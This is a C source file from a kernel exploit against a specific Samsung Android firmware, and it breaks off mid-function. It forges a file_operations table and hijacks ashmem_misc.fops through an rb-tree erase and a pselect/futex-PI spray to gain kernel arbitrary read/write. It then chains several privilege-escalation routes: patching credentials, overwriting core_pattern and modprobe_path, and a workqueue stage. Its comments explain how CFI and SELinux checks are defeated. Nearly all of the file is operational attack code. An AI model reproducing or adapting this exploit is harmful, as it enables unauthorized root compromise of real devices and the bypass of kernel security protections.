
#include "common.h"

#ifdef FUTEX_POISON_PROBE

#include "futex_pi_v14.h"

#endif

#if !defined(APP_PHYS_P0_ORACLE) || !APP_PHYS_P0_ORACLE

#if defined(APP_PAYLOAD) && APP_PAYLOAD

#define PSELECT_CFI_ROUTE_ATTEMPTS 4

#else

#define PSELECT_CFI_ROUTE_ATTEMPTS 1

#endif

#endif
atomic_int cfi_stage_done;
ssize_t cfi_write_ret = -1;
ssize_t cfi_read_ret = -1;
ssize_t cfi_read_slot_ret = -1;
ssize_t cfi_owner_ret = -1;
ssize_t cfi_restore_ret = -1;
uint64_t fops_before;
uint64_t fops_after;
int cfi_attempts;
int pipe_stage_attempts;
int cfi_dirty_seen;
int cfi_last_step;
int cfi_last_errno;
int kaslr_done;
uint64_t kaslr_base;
uint64_t kaslr_slide;
uint64_t slide_bootid_before;
uint64_t slide_bootid_after;
uint64_t slide_bootid_want;
ssize_t slide_bootid_restore_ret = -1;
static int one_page_span(uintptr_t start, size_t len) {
  if (!len || start > UINTPTR_MAX - (len - 1)) {
    return 0;
  }
  return (start >> PAGE_SHIFT) == ((start + len - 1) >> PAGE_SHIFT);
}
static int audit_fake_fops_table(int fd) {
  enum { span = FOPS_SHOW_FDINFO_OFF + sizeof(uint64_t) };
  _Static_assert(span % sizeof(uint64_t) == 0, "fops span alignment");
  uint64_t table[span / sizeof(uint64_t)];
  if (!one_page_span(fake_fops, sizeof(table))) {
    pr_warning("cfi fake fops crosses page start=%016zx size=%zu\n", fake_fops,
               sizeof(table));
    return 0;
  } /* fake_fops is in a direct-map page, so read it through the guard. */
  ssize_t rd = walk_read_kernel_bytes(fd, fake_fops, table, sizeof(table));
  if (rd != (ssize_t)sizeof(table)) {
    pr_warning(
        "cfi fake fops read failed ret=%zd start=%016zx size=%zu errno=%d\n",
        rd, fake_fops, sizeof(table), errno);
    return 0;
  }
  struct expected_slot {
    size_t off;
    uint64_t value;
  } expected[] = {
      {FOPS_OWNER_OFF, 0},
      {FOPS_READ_OFF, 0},
      {FOPS_WRITE_OFF, 0},
      {FOPS_READ_ITER_OFF, text_addr(CONFIGFS_READ_ITER)},
      {FOPS_WRITE_ITER_OFF, text_addr(CONFIGFS_BIN_WRITE_ITER)},
      {FOPS_IOCTL_OFF, text_addr(ASHMEM_IOCTL)},
      {FOPS_COMPAT_IOCTL_OFF, text_addr(ASHMEM_COMPAT_IOCTL)},
      {FOPS_MMAP_OFF, text_addr(ASHMEM_MMAP)},
      {FOPS_OPEN_OFF, text_addr(ASHMEM_OPEN)},
      {FOPS_RELEASE_OFF, text_addr(ASHMEM_RELEASE)},
      {FOPS_SPLICE_READ_OFF, text_addr(COPY_SPLICE_READ)},
      {FOPS_SHOW_FDINFO_OFF, text_addr(ASHMEM_SHOW_FDINFO)},
  };
  pr_info(
      "cfi fake fops span=%016zx-%016zx owner=%016llx llseek=%016llx "
      "read=%016llx write=%016llx\n",
      fake_fops, fake_fops + sizeof(table) - 1,
      (unsigned long long)table[FOPS_OWNER_OFF / sizeof(uint64_t)],
      (unsigned long long)table[FOPS_LLSEEK_OFF / sizeof(uint64_t)],
      (unsigned long long)table[FOPS_READ_OFF / sizeof(uint64_t)],
      (unsigned long long)table[FOPS_WRITE_OFF / sizeof(uint64_t)]);
  /* ->llseek is checked separately because the slide route CLOBBERS it, by
   * design, and that is not repairable.
   *
   * The slide forges an rb_node with __rb_parent_color = fake_fops and
   * rb_right = ashmem_misc.fops. The hijack itself is the primary effect:
   * __rb_erase_augmented() stores pc into child->__rb_parent_color, i.e. it
   * writes fake_fops into ashmem_misc.fops. But __rb_change_child() first
   * deposits `child` into pc->rb_right, and rb_right sits at +8 in struct
   * rb_node - which is exactly fake_fops + 8, the ->llseek slot. So the slide
   * always leaves ashmem_misc.fops there.
   *
   * pc MUST be fake_fops for the primary write to land correctly, so the clobber
   * is unavoidable with this route. It is also benign in practice: nothing ever
   * lseek()s this fd (the exploit only pread/pwrite/ioctl it), which is why the
   * exploit reached root historically with this exact value in place. An
   * AAR-based repair is impossible regardless - writes into our own reclaim
   * page return success and change nothing (measured; see put_fake_fops_table).
   *
   * So accept either value: noop_llseek if the slide has not run yet, or
   * ashmem_misc.fops once it has. Anything else means the table is not ours. */
  uint64_t got_llseek = table[FOPS_LLSEEK_OFF / sizeof(uint64_t)];
  uint64_t want_llseek_slid = data_addr(ASHMEM_MISC_FOPS);
  uint64_t want_llseek_built = text_addr(NOOP_LLSEEK);
  if (got_llseek != want_llseek_slid && got_llseek != want_llseek_built) {
    pr_warning("cfi fake fops llseek mismatch got=%016llx slid=%016llx "
               "built=%016llx\n",
               (unsigned long long)got_llseek,
               (unsigned long long)want_llseek_slid,
               (unsigned long long)want_llseek_built);
    return 0;
  }
  rmg_diag("LLSEEK audit ok value=%016llx (%s)\n",
           (unsigned long long)got_llseek,
           got_llseek == want_llseek_slid ? "post-slide clobber, expected"
                                         : "build-time noop_llseek");
  for (size_t i = 0; i < sizeof(expected) / sizeof(expected[0]); ++i) {
    uint64_t got = table[expected[i].off / sizeof(uint64_t)];
    if (got != expected[i].value) {
      pr_warning(
          "cfi fake fops slot mismatch off=0x%zx got=%016llx want=%016llx\n",
          expected[i].off, (unsigned long long)got,
          (unsigned long long)expected[i].value);
      return 0;
    }
  }
  return 1;
}
static int fake_fops_owner_is_zero(int fd) {
  uint64_t owner =
      UINT64_MAX; /* fake_fops lives in a direct-map page. On F946BXXS7GZH2 a
                     read of a direct-map   * address through the AAR panics the
                     kernel (measured), so this read has to go   * through the
                     same slab_cache_guard the walk uses. fops.c cannot see
                     pipe.c's   * statics, so this calls the shared helper
                     instead. */
  ssize_t rd = walk_read_kernel_u64(fd, fake_fops + FOPS_OWNER_OFF, &owner);
  cfi_owner_ret = rd;
  rmg_diag("CFI owner read ret=%zd value=%016llx errno=%d fakepp=%016zx\n", rd,
           (unsigned long long)owner, errno, fake_fops);
  if (rd != (ssize_t)sizeof(owner) || owner != 0) {
    pr_warning("cfi fake fops owner mismatch ret=%zd value=%016llx errno=%d\n",
               rd, (unsigned long long)owner, errno);
    return 0;
  }
  return 1;
}
#if !defined(APP_PHYS_P0_ORACLE) || !APP_PHYS_P0_ORACLE
static int route_delay_usec(int attempt) {
  const char *forced = getenv("PSELECT_DELAY_USEC");
  if (forced && *forced) {
    char *end = NULL;
    errno = 0;
    long value = strtol(forced, &end, 0);
    if (!errno && end != forced && !*end && value >= 0 && value <= 1000000) {
#if defined(APP_PAYLOAD) && APP_PAYLOAD
      static const int offsets[] = {0, 5000, 0, 5000};
      size_t index =
          (size_t)(attempt - 1) % (sizeof(offsets) / sizeof(offsets[0]));
      return (int)value + offsets[index];
#else
      return (int)value;
#endif
    }
  }
  static const int delays[] = {
      50000, 30000, 70000, 10000, 100000, 150000, 20000, 120000,
  };
  int count = (int)(sizeof(delays) / sizeof(delays[0]));
  return delays[(attempt - 1) % count];
}
#endif

#if !defined(APP_PHYS_P0_ORACLE) || !APP_PHYS_P0_ORACLE || \
    !defined(SLIDE_STACK_WRITER)
void fdset_put_word(fd_set *set, int word, uint64_t value) {
  unsigned long *bits = (unsigned long *)set;
  bits[word] = (unsigned long)value;
}
#endif

#if !defined(APP_PHYS_P0_ORACLE) || !APP_PHYS_P0_ORACLE
void open_selected_fds(fd_set *in, fd_set *out, fd_set *ex, int read_fd,
                       int write_fd) {
  int high_write = fcntl(write_fd, F_DUPFD, PSELECT_ROUTE_NFDS + 32);
  if (high_write < 0) {
    pr_warning("pselect F_DUPFD write errno=%d\n", errno);
    return;
  }
  for (int fd = 0; fd < PSELECT_ROUTE_NFDS; fd++) {
    if (FD_ISSET(fd, in) || FD_ISSET(fd, out) || FD_ISSET(fd, ex)) {
      dup2(high_write, fd);
    }
  }
  close(high_write);
  dup2(read_fd, PSELECT_ROUTE_NFDS - 1);
  FD_SET(PSELECT_ROUTE_NFDS - 1, ex);
}
void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
  FD_ZERO(in);
  FD_ZERO(out);
  FD_ZERO(ex);
  fdset_put_word(in, 0, fake_w0);
  fdset_put_word(in, 1, 0);
  fdset_put_word(in, 2, 0);
  fdset_put_word(in, 3, 0);
  fdset_put_word(ex, 0, text_addr(INIT_TASK));
  fdset_put_word(ex, 1, fake_lock);
  fdset_put_word(ex, 2, 3);
  fdset_put_word(ex, 3, 0);
}
void do_pselect_fake_lock_route(void) {
  if (!page_base || !fake_lock || !fake_fops) {
    cfi_last_step = 30;
    cfi_last_errno = 0;
    pr_error(
        "pselect route missing kernel page base=%016zx lock=%016zx "
        "fops=%016zx\n",
        page_base, fake_lock, fake_fops);
    return;
  }
  int calls = 0;
  int success = 0;
  int route_verified = 0;
  for (int route_attempt = 1; route_attempt <= PSELECT_CFI_ROUTE_ATTEMPTS;
       route_attempt++) {
    if (route_attempt != 1) {
      page_base = prepare_good_kernel_page(PAGE_PAYLOAD_FOPS);
      if (!page_base || !fake_lock || !fake_fops) {
        cfi_last_step = 34;
        cfi_last_errno = errno;
        pr_error(
            "pselect retry page prepare failed attempt=%d base=%016zx "
            "lock=%016zx fops=%016zx\n",
            route_attempt, page_base, fake_lock, fake_fops);
        break;
      }
    }
    int pipefd[2];
    SYSCHK(pipe(pipefd));
    int high_read = fcntl(pipefd[0], F_DUPFD, PSELECT_ROUTE_NFDS + 16);
    if (high_read < 0) {
      cfi_last_step = 31;
      cfi_last_errno = errno;
      pr_error("pselect F_DUPFD read errno=%d\n", errno);
      close(pipefd[0]);
      close(pipefd[1]);
      break;
    }
    fd_set in;
    fd_set out;
    fd_set ex;
    prepare_pselect_fdsets(&in, &out, &ex);
    open_selected_fds(&in, &out, &ex, high_read, pipefd[1]);
    atomic_store(&consumer_calls, 0);
    atomic_store(&consumer_success, 0);
    atomic_store(&punch_consume_stop, 0);
    int delay_usec = route_delay_usec(route_attempt);
    atomic_store(&main_route_delay_usec, delay_usec);
    atomic_store(&punch_consume_go, route_attempt);
    struct timespec timeout = {
        .tv_sec = PSELECT_TIMEOUT_SEC,
        .tv_nsec = 0,
    };
    struct timespec *timeoutp = &timeout;
    errno = 0;
    int ret = pselect(PSELECT_ROUTE_NFDS, &in, &out, &ex, timeoutp, NULL);
    int saved_errno = errno;
    atomic_store(&punch_consume_go, 0);
    calls = atomic_load(&consumer_calls);
    success = atomic_load(&consumer_success);
    pr_info(
        "pselect returned attempt=%d ret=%d errno=%d calls=%d success=%d "
        "delay=%d\n",
        route_attempt, ret, saved_errno, calls, success, delay_usec);
    int route_signal = calls > 0 && success > 0;
    if (route_signal) {
      if (try_cfi_stage()) {
        cfi_last_step = 0;
        route_verified = 1;
      } else if (!cfi_last_step) {
        cfi_last_step = 32;
      }
    } else if (!route_verified) {
      cfi_last_step = 33;
      cfi_last_errno = saved_errno;
    }
    close(high_read);
    close(pipefd[0]);
    close(pipefd[1]);
    if (route_verified || cfi_dirty_seen) {
      break;
    }
    pr_info(
        "pselect cfi miss attempt=%d/%d step=%d errno=%d; refreshing FOPS "
        "page\n",
        route_attempt, PSELECT_CFI_ROUTE_ATTEMPTS, cfi_last_step,
        cfi_last_errno);
  }
  pr_info("pselect route done calls=%d success=%d step=%d errno=%d\n", calls,
          success, cfi_last_step, cfi_last_errno);
}
#endif

#ifdef FUTEX_POISON_PROBE
/* * POISON PROBE - compiled only by build_f946b_poison.bat. * * It lives HERE,
 * outside the APP_PHYS_P0_ORACLE / pselect-route region above, * on purpose:
 * that whole region is preprocessed out when target.h defines *
 * APP_PHYS_P0_ORACLE=1 (which the app build does), so a probe defined in there
 * * compiles to nothing and main.c is left with an unresolved reference - *
 * dlopen() then fails with 'cannot locate symbol "futex_poison_probe"'. * * The
 * experiment: run the v14 choreography with a poisoned payload and let the *
 * kernel name the node it erases (see the long comment in futex_pi_v14.h). * A
 * poison fault reboots the device and ends the run; a clean return already *
 * answers the other half of the question, which is that no erase happened. * *
 * Default visibility is mandatory: the tree builds with -fvisibility=hidden *
 * and this is the one symbol main.c reaches across translation units, so it *
 * must land in .dynsym. */
__attribute__((visibility("default"))) int futex_poison_probe(int fd) {
  struct futex_pi_v14_config cfg;
  memset(&cfg, 0, sizeof(cfg));
  /* Take EVERY address from the forge that just ran rather than recomputing
   * offsets here. prepare_p0_diag_gate_payload() lays the objects down at the
   * SLIDE_BANK_* offsets (task +0x1000, lock +0x5200) and then publishes them
   * through the fake_task / fake_lock / fake_w0 globals. This probe used to
   * compute page_base + FAKE_TASK_OFF (0x3200) and page_base + W0_OFF (0x2350)
   * independently, which point at entirely different addresses than the bank the
   * forge writes - so even once wired up, the trigger and the forge could never
   * agree. Deriving cfg from the globals makes that class of mismatch impossible.
   *
   * The probe also used to be called from main.c BEFORE try_cfi_stage(), i.e.
   * before the physrw fd existed and before anything wrote the forged objects,
   * so every prior run walked uninitialised page memory and hung. It is now
   * called from run_p0_pipe_oracle_diagnostic() immediately after the forge. */
  if (!fake_task || !fake_lock || !fake_w0) {
    pr_error("POISON refusing to trigger: forge globals unset "
             "task=%016zx lock=%016zx w0=%016zx\n",
             fake_task, fake_lock, fake_w0);
    return 0;
  }
  cfg.page_base = page_base;
  cfg.target_fops = data_addr(ASHMEM_MISC_FOPS);
  cfg.fake_fops = fake_fops;
  cfg.fake_lock = fake_lock;
  cfg.fake_task = fake_task;
  /* struct rb_node is 24 bytes (unsigned long __rb_parent_color + rb_right +
   * rb_left), so the waiter's `task` field - the one rt_mutex_top_waiter()
   * dereferences after rb_entry(..., tree_entry) - lands at +0x18. That is the
   * address the fake task_struct's pi_tree_entry aliases. */
  cfg.pi_waiters_self = fake_w0 + 0x18;
  cfg.signal_scratch = page_base + SCRATCH_OFF;

  /* Positive evidence that the forge is self-consistent BEFORE the kernel is
   * pointed at it. Layout verified against this tree's headers:
   *   struct rb_node        -> 24 bytes, so waiter->task at tree_entry + 0x18
   *   struct rb_root_cached -> 16 bytes (rb_root is only rb_node here), giving
   *                           rt_mutex_base: wait_lock 0x00, waiters.rb_root
   *                           0x08, waiters.rb_leftmost 0x10, owner 0x18. */
  {
    /* Runtime-addressed, so this must NOT be a static const initializer. */
    uintptr_t slots[] = {
        /* rt_mutex_base */
        fake_lock + 0x08,                          /* waiters.rb_root      */
        fake_lock + 0x10,                          /* waiters.rb_leftmost  */
        fake_lock + 0x18,                          /* owner                */
        /* rt_mutex_waiter */
        fake_w0 + 0x00,                            /* tree_entry.parent    */
        fake_w0 + 0x08,                            /* tree_entry.rb_right  */
        fake_w0 + 0x10,                            /* tree_entry.rb_left   */
        fake_w0 + 0x18,                            /* waiter->task         */
        fake_w0 + 0x20,                            /* waiter->lock         */
    };
    static const char *const names[] = {
        "lock.waiters.rb_root", "lock.waiters.rb_leftmost", "lock.owner",
        "waiter.tree.parent",   "waiter.tree.rb_right",     "waiter.tree.rb_left",
        "waiter.task",          "waiter.lock",
    };
    pr_info("POISON forge verify (rt_mutex/waiter):\n");
    for (size_t index = 0; index < sizeof(slots) / sizeof(slots[0]); index++) {
      uint64_t value = 0;
      ssize_t got = walk_read_kernel_u64(fd, slots[index], &value);
      pr_info("POISON   %-26s @%016zx = %016llx (rd=%zd)\n", names[index],
              slots[index], (unsigned long long)value, got);
    }
    pr_info("POISON forge verify: fake_task=%016zx fake_lock=%016zx "
            "fake_w0=%016zx pi_waiters_self=%016zx expected_self=%016zx\n",
            fake_task, fake_lock, fake_w0, cfg.pi_waiters_self,
            fake_w0 + 0x18);
  }
  pr_info(
      "POISON probe: base=%016zx target_fops=%016zx fake_fops=%016zx "
      "lock=%016zx task=%016zx self=%016zx scratch=%016zx\n",
      cfg.page_base, cfg.target_fops, cfg.fake_fops, cfg.fake_lock,
      cfg.fake_task, cfg.pi_waiters_self, cfg.signal_scratch);
  pr_info(
      "POISON sentinels: tree=%016llx pi=%016llx separation=%d bytes "
      "(POISON_ARM=%s)\n",
      (unsigned long long)FUTEX_PI_V14_POISON_TREE_RIGHT,
      (unsigned long long)FUTEX_PI_V14_POISON_PI_TREE_RIGHT,
      (int)(FUTEX_PI_V14_POISON_PI_TREE_RIGHT - FUTEX_PI_V14_POISON_TREE_RIGHT),
      getenv("POISON_ARM") ? getenv("POISON_ARM") : "b(default)");
  int triggered = futex_pi_v14_trigger(&cfg);
  pr_info("POISON result: triggered=%d step=%d (%s) handler=%d\n", triggered,
          futex_pi_v14_last_step(),
          futex_pi_v14_step_name(futex_pi_v14_last_step()),
          futex_pi_v14_handler_result());
  return triggered;
}
#endif
int repair_fake_fops_llseek(int fd) {
  uint64_t llseek = text_addr(NOOP_LLSEEK);
  uint64_t before = 0;
  uint64_t after = 0;
  uintptr_t slot = fake_fops + FOPS_LLSEEK_OFF;
  if (!one_page_span(slot, sizeof(llseek))) {
    errno = ERANGE;
    return 0;
  } /* `slot` is inside fake_fops, i.e. a direct-map address: read it guarded.
       The   * write can stay unguarded - writes to the direct map work. */
  ssize_t before_rd = walk_read_kernel_u64(fd, slot, &before);
  if (before_rd != (ssize_t)sizeof(before)) {
    return 0;
  }
  pr_info("cfi llseek before=%016llx want=%016llx slot=%016zx\n",
          (unsigned long long)before, (unsigned long long)llseek, slot);
  if (before == llseek) {
    return 1;
  }
  /* The post-slide value is ashmem_misc.fops, and that is EXPECTED, not damage.
   *
   * The slide forges an rb_node with __rb_parent_color = fake_fops and
   * rb_right = ashmem_misc.fops. The hijack is the primary effect - the erase
   * stores pc into child->__rb_parent_color, writing fake_fops into
   * ashmem_misc.fops - but it first deposits `child` into pc->rb_right, and
   * rb_right is at +8 in struct rb_node, i.e. exactly fake_fops + 8. pc has to be
   * fake_fops for the primary write to be correct, so this clobber is inherent to
   * the route and cannot be designed out.
   *
   * It is benign because nothing lseek()s this fd: the exploit only pread,
   * pwrite and ioctl it, which is why the exploit reached root with this exact
   * value in place. An AAR repair is impossible in any case - writes into our own
   * reclaim page return success and change nothing (measured; three writes, three
   * unchanged reads, confirmed by two independent readers).
   *
   * So this is a report, not a repair. audit_fake_fops_table() is what actually
   * validates the slot, and it accepts both legitimate values. */
  if (before == data_addr(ASHMEM_MISC_FOPS)) {
    rmg_diag("LLSEEK holds the post-slide clobber ashmem_misc.fops=%016llx; "
             "benign (nothing lseeks this fd) and not repairable via the AAR\n",
             (unsigned long long)before);
    return 1;
  }
  rmg_diag("LLSEEK slot=%016zx holds=%016llx want=%016llx - table is not ours\n",
           slot, (unsigned long long)before, (unsigned long long)llseek);
  return 0;
}

int restore_slide_boot_id(int fd) {
  uintptr_t boot_id_data_ptr =
      SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR + slide_p0_offset;
  slide_bootid_want = slide_canon_addr(SLIDE_SYSCTL_BOOTID);
  configfs_read_once(fd, boot_id_data_ptr, &slide_bootid_before,
                     sizeof(slide_bootid_before));
  slide_bootid_restore_ret = configfs_write_once(
      fd, boot_id_data_ptr, &slide_bootid_want, sizeof(slide_bootid_want));
  configfs_read_once(fd, boot_id_data_ptr, &slide_bootid_after,
                     sizeof(slide_bootid_after));
  pr_info(
      "slide restore boot_id data pid=%d ret=%zd before=%016llx "
      "want=%016llx after=%016llx errno=%d\n",
      getpid(), slide_bootid_restore_ret,
      (unsigned long long)slide_bootid_before,
      (unsigned long long)slide_bootid_want,
      (unsigned long long)slide_bootid_after, errno);
  int boot_id_restored =
      slide_bootid_restore_ret == (ssize_t)sizeof(slide_bootid_want) &&
      slide_bootid_after == slide_bootid_want;
#ifdef SLIDE_RB_PARENT_TYPE_RESTORE
  uintptr_t parent_type =
      SLIDE_NFULNL_LOGGER_OBJECT + slide_p0_offset + sizeof(uint64_t);
  uint64_t type_before = 0;
  uint64_t type_after = 0;
  uint64_t type_want = SLIDE_RB_PARENT_TYPE_RESTORE;
  configfs_read_once(fd, parent_type, &type_before, sizeof(type_before));
  ssize_t type_restore_ret =
      configfs_write_once(fd, parent_type, &type_want, sizeof(type_want));
  configfs_read_once(fd, parent_type, &type_after, sizeof(type_after));
  pr_info(
      "slide restore rb parent type pid=%d ret=%zd before=%016llx "
      "want=%016llx after=%016llx errno=%d\n",
      getpid(), type_restore_ret, (unsigned long long)type_before,
      (unsigned long long)type_want, (unsigned long long)type_after, errno);
  return boot_id_restored && type_restore_ret == (ssize_t)sizeof(type_want) &&
         type_after == type_want;
#else
  return boot_id_restored;
#endif
}
int install_child_root(int fd) {
  /* The pipe physrw stage is NOT a valid precondition for root:
   *
   *  - it is unsatisfiable on this device. F_SETPIPE_SZ is refused 0 successes /
   *    25520 refusals, so past the per-user soft limit pipe() silently returns a
   *    ONE-slot ring allocated from kmalloc-128 (fs/pipe.c:803, PIPE_MIN_DEF_BUFFERS
   *    == 1) and never a 16-page kmalloc-1k ring. Measured: all 12 attempts of
   *    every run fail identically with gate=0 rd=0 wr=0 rd64=0 wr64=0, and
   *    prepare_pipe_buffer_page() falls back to returning page_base itself, so
   *    pipebuf_page_base == page_base and the scan is reading our own page.
   *  - its deterministic mode is worse than useless: the walk's first
   *    task_struct read (784 bytes, hardened) never returns and the device
   *    reboots, taking the skipped CFI restore with it.
   *  - root.c has NO reference to pipebuf_page_base or pipe_cache at all - the modprobe
   *    attempt addresses modprobe_path through text_addr()/data_direct_addr() and reads
   *    no pipe memory whatsoever. (page_base IS pipebuf_page_base; the point is that
   *    modprobe_path_root_attempt() never touches it.)
   *  - the physrw primitive root actually needs is already proven independently by
   *    the CFI ladder, which reaches cfi_step=0 (success) and leaves ashmem_misc.fops
   *    hijacked onto fake_fops.
   *
   * So `install_pipe_physrw(fd) && install_android_root(fd)` guaranteed that the root
   * stage never ran on this device. Attempt root regardless, and say so loudly. */
  /* The pipe stage is opt-in (ROOT_PIPE=1) and, when enabled, still runs first
   * so a comparison run is byte-for-byte the old order. With the knob unset -
   * the default, and the only configuration that can make progress here - it is
   * skipped outright, because both of its modes are closed by measurement (see
   * the long note next to pipe_stage_enabled above) and one of them panics. */
  const char *rp_root_env = getenv("ROOT_PIPE");
  if (rp_root_env && rp_root_env[0] && rp_root_env[0] != '0') {
    if (!install_pipe_physrw(fd)) {
      rmg_diag(
          "ROOT proceeding WITHOUT pipe physrw (unsatisfiable here: F_SETPIPE_SZ "
          "0/25520 -> 1-slot kmalloc-128 rings, never kmalloc-1k; physrw itself is "
          "already proven by cfi_step=0)\n");
    }
  } else {
    rmg_diag("ROOT pipe physrw stage SKIPPED (ROOT_PIPE unset; measured "
             "unsatisfiable on the legacy path and fatal on the walk path)\n");
  }
  /* Credential patch first: it is the only route that does not have to be let
   * through the AVC. The modprobe_path plant works - run 14/15 verified the path
   * in the image - but request_module() is refused by SELinux for u:r:shell:s0
   * (measured: the binfmt trigger's execve returns ENOEXEC, which fs/exec.c only
   * produces after request_module() returned < 0, and AF_ALG/mount return EACCES),
   * and modprobe_path has exactly one caller in the tree. With an arbitrary kernel
   * write in hand, patching this thread's cred is both shorter and immune to that.
   *
   * DEFAULT IS NOW OFF, because that premise is measured false: the task slab is
   * unreachable on this firmware, so every step of this route that touches a
   * foreign task_struct panics the kernel and the process never reaches the
   * modprobe_path stage below. Three independent runs, all fatal:
   *   ROOT cp list head=ffffffc00ac7d550 next=ffffff8837b6a8d0
   *   RD target=ffffff8837b6a798 ... len=8    (usage read - faults)
   *   WR plan delivered ... target=ffffff8837b6c798 ... len=8   (blind scan - faults)
   *   RD target=ffffff8837b684d0 ... len=16  (walk node read - faults)
   * and note page=92978c2708401adc: the driver DOES resolve a slab page descriptor
   * and then faults on access, so this is a region restriction rather than a bad
   * address or a bad base encoding. ROOT_CP=1 re-enables the route to reproduce
   * that result on demand; the default run goes straight to the route that lands. */
  if (!getenv("ROOT_CP")) {
    rmg_diag("ROOT cred-patch stage SKIPPED (ROOT_CP unset; the task slab is "
             "unreachable on this firmware and every attempt panics - see the "
             "comment above)\n");
  } else if (root_cred_patch_attempt(fd)) {
    rmg_diag("ROOT cred-patch SUCCEEDED (uid=0); skipping the modprobe_path stage "
             "and the workqueue stage\n");
    return 1;
  }
  rmg_diag("ROOT cred-patch did not reach uid=0; falling through to modprobe_path\n");
  /* Try the walk-free modprobe_path route FIRST. It touches only kernel .data
   * through the image-window ARW the CFI ladder already proved, whereas
   * install_android_root()'s workqueue fallback has to dereference heap
   * pointers and dies on this firmware (a direct-map READ panics it, measured
   * in run 9b). On a hit the helper itself has already written the creds
   * banner and run the activation sequence, so the workqueue stage is pure
   * downside and is skipped; on a miss behaviour is exactly as before. */
  /* core_pattern pipe mode. Runs BEFORE the modprobe attempt because it is strictly better on
   * this device: it needs only the .data write we already have, it does NOT traverse
   * security_kernel_module_request() (which AVC-denies u:r:shell:s0 and is the sole reason the
   * modprobe_path stage below can never fire here), and the work it queues is executed by a
   * kworker carrying init_cred.
   * Opt-in (ROOT_CPIPE=1) because it writes a kernel global that persists until reboot.
   * Additive: on a miss, behaviour is exactly as before. */
  if (getenv("ROOT_CPIPE")) {
    if (core_pattern_root_attempt(fd)) {
      rmg_diag("ROOT core_pattern SUCCEEDED; skipping the remaining root stages\n");
      return 1;
    }
    rmg_diag("ROOT core_pattern stage failed; continuing to the next route\n");
  }
  if (modprobe_path_root_attempt(fd)) {
    rmg_diag("ROOT modprobe_path SUCCEEDED; skipping the workqueue stage "
             "(its heap reads panic this firmware)\n");
    return 1;
  }
  /* Static-work cascade BEFORE the legacy gate. The cascade is pure
   * kernel .data (shape reads plus readback-verified plants, no SLAB
   * writes at all), so the heap-panic rationale below does not apply
   * to it - and payload consumers that never set ROOT_LEGACY (the
   * app's auto flows) would otherwise never reach the proven route.
   * Additive: on a miss behaviour is exactly as before. */
  if (install_static_work_stage(fd)) {
    rmg_diag("ROOT static-work cascade SUCCEEDED; skipping the legacy "
             "workqueue stage\n");
    return 1;
  }
  rmg_diag("ROOT static-work cascade missed; continuing to the legacy gate\n");
  /* Do NOT fall through to install_android_root() by default. Its workqueue
   * stage dereferences a heap pointer returned by the AAR and has panicked this
   * firmware on both attempts: run 9b died at "RD target=ffffff805f7f2400", the
   * modprobe-refusal run died at "RD target=ffffff805f7f3f00", and in each case
   * the log stops with no "RD pread ret=" line after it. A panic here turns "no
   * root this attempt" into "the device reboots with ashmem_misc.fops still
   * pointing at the forged table", because the CFI restore is skipped on the way
   * down - which is exactly why the next attempt starts stale. Stopping costs a
   * failed attempt and keeps the device usable for the next one.
   *
   * ROOT_LEGACY=1 restores the old fall-through for a controlled test of the
   * workqueue stage itself. */
  if (!getenv("ROOT_LEGACY")) {
    rmg_diag("ROOT legacy workqueue stage SKIPPED (measured to panic this "
             "firmware; set ROOT_LEGACY=1 to run it anyway)\n");
    return 0;
  }
  rmg_diag("ROOT legacy workqueue stage requested by ROOT_LEGACY=1\n");
  return install_android_root(fd);
}
int try_cfi_stage(void) {
  cfi_attempts++;
  int fd = open_ashmem_device();
  int dirty = 0;
  int can_read_back = 0;
  if (fd < 0) {
    cfi_last_step = 11;
    cfi_last_errno = errno;
    return 0;
  }
  uintptr_t misc_fops = data_addr(ASHMEM_MISC_FOPS);
  uint64_t pre_fops = 0;
  ssize_t pre_rb =
      configfs_read_once(fd, misc_fops, &pre_fops, sizeof(pre_fops));
  rmg_diag(
      "CFI begin misc_fops=%016zx read=%016llx want=%016zx ret=%zd errno=%d\n",
      misc_fops, (unsigned long long)pre_fops, fake_fops, pre_rb, errno);
  if (pre_rb != (ssize_t)sizeof(pre_fops) || pre_fops != fake_fops) {
    pr_warning(
        "cfi misc_fops mismatch ret=%zd target=%016zx "
        "read=%016llx want=%016zx errno=%d\n",
        pre_rb, misc_fops, (unsigned long long)pre_fops, fake_fops, errno);
    fops_before = pre_fops;
    cfi_last_step = 4;
    cfi_last_errno = errno;
    goto fail;
  }
  if (!audit_fake_fops_table(fd)) {
    cfi_last_step = 12;
    cfi_last_errno = errno;
    goto fail;
  }
  char payload[] = "CFI_FRIENDLY_CONFIGFS_BIN_WRITE_OK";
  /* Is the scratch target inside the reclaim slab we built ourselves?
   *
   * It always is: binwrite_target = payload_base + SCRATCH_OFF and fake_fops =
   * payload_base + FOPS_OFF, so the friendly-write proof is aimed at memory this
   * payload owns. And AAR writes into our own page are a proven SILENT NO-OP -
   * they return the full length and change nothing (measured: three writes at
   * slot-16/slot/slot+16, three reads unchanged, confirmed by two independent
   * readers, the guarded walk_read_kernel_u64 and the unguarded
   * configfs_read_once).
   *
   * So the memcmp below could never pass, and it did not: the device reported
   *     CFI FAIL path step=3 ... write_ret=35 read_ret=35
   * i.e. the read returned all 35 bytes - the LENGTH check passed and only the
   * content compare failed, because the target still held zeros. Every step=3
   * was this same false negative, not a configfs failure.
   *
   * When the target is self-owned the test therefore carries no information, so
   * it is reported and skipped rather than treated as a failure. The write
   * primitive is still verified where it actually matters: the slide's hijack is
   * read back at "CFI begin" (read==want==fake_fops) and the restore is read back
   * at "CFI restore readback" (got==want). Both are real proofs on memory we do
   * not own. */
  const int scratch_is_ours =
      page_base != 0 && binwrite_target >= page_base &&
      binwrite_target < page_base + ORDER3_SIZE;
  rmg_diag("CFI scratch target=%016zx page_base=%016zx ours=%d\n",
           binwrite_target, page_base, scratch_is_ours);
  unsigned char payload_before[sizeof(payload)];
  if (!one_page_span(binwrite_target, sizeof(payload)) ||
      walk_read_kernel_bytes(fd, binwrite_target, payload_before,
                             sizeof(payload_before)) !=
          (ssize_t)sizeof(payload_before)) {
    cfi_last_step = 13;
    cfi_last_errno = errno;
    goto fail;
  }
  for (size_t i = 0; i < sizeof(payload_before); ++i) {
    if (payload_before[i] != 0) {
      pr_warning("cfi scratch not zero target=%016zx off=0x%zx value=0x%02x\n",
                 binwrite_target, i, payload_before[i]);
      cfi_last_step = 13;
      cfi_last_errno = 0;
      goto fail;
    }
  }
  pr_info("cfi scratch span=%016zx-%016zx old=zero size=%zu\n", binwrite_target,
